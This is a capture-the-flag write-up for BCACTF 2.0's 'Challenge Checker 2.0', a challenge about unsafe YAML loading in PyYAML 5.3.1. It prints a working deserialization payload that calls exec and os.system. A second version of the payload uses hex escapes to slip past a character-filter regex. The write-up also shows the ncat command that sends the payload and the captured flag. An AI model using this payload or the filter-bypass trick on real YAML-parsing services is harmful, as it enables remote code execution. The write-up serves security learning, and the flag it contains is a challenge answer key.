# Challenge Checker 2.0 

#### Category : misc
#### Points : 200 points (59 solves)
#### Author : anli, Edward Feng

## Challenge
New version, better security, right?

-   [chall.yaml](https://objects.bcactf.com/bcactf2/challenge-checker-2/chall.yaml)
-   [requirements.txt](https://objects.bcactf.com/bcactf2/challenge-checker-2/requirements.txt)
-   [verify.py](https://objects.bcactf.com/bcactf2/challenge-checker-2/verify.py)
-   `nc misc.bcactf.com 49154`

## Solution

#### Bypassing the new version
Comparing to [Challenge Checker](https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BCACTF%202.0/Challenge%20Checker), we see from `requirements.txt` that the version has been upgraded to PyYAML 5.3.1 but it still has vulnerabilites.

Looking at https://hackmd.io/@harrier/uiuctf20,
it seems that the update is to block special characters like `.` and `_`.

To bypass this we change our payload from
```bash
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "import os; os.system('cat flag.txt')"
 ```
 
 to
 ```bash
 !python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "\x5f\x5fimport\x5f\x5f('os')\x2esystem('cat flag\x2etxt')"
 ```
 
 So we basically changed special characters to their hex escaped values in order to bypass the regex check.
 
 #### Getting flag.txt
 Now  we just need to send the payload to the server
 
 ```bash
$ cat payload| ncat misc.bcactf.com 49154                                         
 
Paste in your chall.yaml file, then send an EOF:
bcactf{y0u_r3ally_0verc00k3d_th05e_yams_j5fc9g}
Fatal error: Data must be a dictionary
```

flag : `bcactf{y0u_r3ally_0verc00k3d_th05e_yams_j5fc9g}`

#### Note
I used ncat instead of nc to send the payload because I was having some problems sending EOF with nc.
 